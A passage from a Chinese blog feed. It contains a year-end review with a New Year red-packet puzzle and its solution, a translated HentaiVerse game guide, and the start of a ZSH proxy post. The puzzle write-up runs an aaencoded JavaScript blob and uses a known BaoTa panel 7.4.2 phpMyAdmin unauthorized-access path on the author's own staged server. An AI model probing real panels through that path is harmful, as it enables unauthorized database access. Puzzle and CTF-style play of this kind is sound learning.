和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 